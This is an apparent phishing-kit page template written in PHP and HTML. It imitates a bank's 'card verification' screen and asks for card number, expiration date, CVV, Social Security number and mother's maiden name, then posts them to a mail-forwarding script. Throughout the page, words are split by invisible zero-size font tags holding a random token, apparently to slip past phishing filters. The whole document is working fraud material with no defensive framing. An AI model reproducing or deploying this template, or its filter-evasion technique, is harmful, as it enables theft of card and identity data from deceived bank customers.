...
<div>
<form action="Spox/Mail/Mail4?token=<?=$rundomizi?>" method="POST">
...
<div>
<h1 id="stepNameTagElementId" tabindex="-1" aria-describedby="stepNameApplicantTypeHeader">Veri<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ficat<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ion</h1>
                  ...
                  <div class="icon">
                    ...
                    <div class="content wrap" id="content-accountOriginationErrorHeader">
                      <h2 class="title" tabindex="-1" id="inner-accountOriginationErrorHeader">
                        <span class="util accessible-text" id="icon-accountOriginationErrorHeader">Im<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>po<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>rtant:</span>It looks like there\'s an issue with the in<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>fo you told us. Ple<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ase do<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>uble-che<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ck your ca<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>rd det<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ai<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ls.</h2>
                      </div>
                    </div>
                ...
                <div id="personalName"  >
                    <div id="personal-name"  >
                        <div class="row">
                            ...
                            <div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">C<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>a<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>rd de<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>tai<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ls</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <div class="BODY field-mb-24">Please verify the c<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>d deta<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ils linked to your account.</div>
                        </div>
                    </div>
                   </div>
</div>
...
<div class="label-wrapper">
  <label class="jpui fieldlabel label-alignment vertical" id="accountIdentifier-label" for="accountIdentifier-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="accountIdentifier-label-errorLabel"></span><font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>C<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>a<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>r<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>d n<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>umb<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>er<div class="yield" id="accountIdentifier-label-additionalContent">
...
<div class="label-wrapper">
  <label class="jpui fieldlabel label-alignment vertical" id="socialSecurityNumber-label" for="socialSecurityNumber-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="socialSecurityNumber-label-errorLabel"></span>E<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>xpir<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>atio<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>n date<div class="yield" id="socialSecurityNumber-label-additionalContent">
      <span class="util accessible-text"></span>
    </div>
...
<span class="jpui validation__accessible-text" id="socialSecurityNumber-text-error-message-accessible">Please tell us a So<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ci<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>al Se<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>curi<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ty nu<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>mber.</span>
...
<div class="row">
  <p class="BODY col-lg-12 userId-text">the thr<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ee-di<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>git C<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>V<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>V numb<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>er is print<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ed on the bac<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>k of the card to the rig<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ht of the signature box.
...
S<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ecu<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ri<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ty co<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>de<div class="yield" id="userId-label-additionalContent">
</div>
...
<div id="identificationId"  >
     ...
     <div id="addressId"  >
      ...
      <div class="row container-padding-after-field">
        <div class="col-xs-12 col-sm-6">
        <div class="jpui header DATABOLD field-mt-0 field-mb-24">C<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>d Veri<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ficat<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ion</div>
 </div>
 </div>
     ...
     </span>Mot<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>her's Mai<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>den Na<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>me <span class="util accessible-text" id="streetAddress-blx-residentialAddressBlock-label-accessible-text">
...
<span class="util accessible-text validation__accessible-text" id="apartmentNumber-blx-residentialAddressBlock-text-validate-placeHolderAdaText">
     ...
     <div id="disclosure"  >
        ...
        <div class="row">
<div class="col-xs-12">
<p class="BODY" id="tcpa-disclosure">for addi<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>tiona<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>l secu<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>rity pl<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ease ver<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ify your m<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>mn to sub<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>mit your c<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>d de<font style="color:transparent;font-size:0px"><?=$rundomizi;?></font>tail.
